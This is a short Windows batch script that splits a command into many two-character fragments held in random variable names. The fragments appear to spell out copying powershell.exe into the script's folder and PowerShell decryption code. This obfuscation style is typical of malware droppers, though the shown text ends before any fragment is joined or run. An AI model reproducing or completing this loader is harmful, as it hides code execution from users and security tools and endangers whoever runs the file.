@echo off
set "uxCDIdRKGY=Wi"
set "JBTGXlfgvU=y "
set "AixTEtUztV=in"
set "HcElHvrXzW=rS"
set "WNLvCHFjaO=ow"
set "PVPJYjLNuO=co"
set "kfRzuHFqKx=ws"
set "XMiFblGbLC=do"
set "YhZNPfjogD=\v"
set "gaZaXVirGt=1."
set "rVAZpfdygo=.e"
set "ptXQBvSCcj=xe"
set "NDPWNjnuGD=he"
set "gFgLZmZZcr=he"
set "nHgJznqyUc=s\"
set "bDregbaOgI=Sy"
set "HvsBetwHpA=32"
set "fzQCSJqkdp=rs"
set "EzdGqzOcCT=py"
set "ETbZYFEbgI=po"
set "miaMRYnRkk= /"
set "GQcshndqNS=\W"
set "aYocwmicdi=we"
set "mXUTFBmhVS=:\"
set "zXouDUIxrW=we"
set "yIJRLldnGA=em"
set "mhdadnRxWz=ll"
set "LSbCfSnXcY= C"
set "qglYsIaOrx=ll"
set "hNzOZyYzXL=Po"
set "GoROJAYDhu=0\"
set "HZDQVGMhaa=st"
set "SkWfNXUnEf=nd"
set "RaAtXPVeZZ= %~dp0"
set "rDizTJeoAY=cd"
set "KsIaScEkTW=]::N"
set "OPHnnGIiDi= = $"
set "XpecIuJZJw=oin "
set "JPihZkdzhU=ecry"
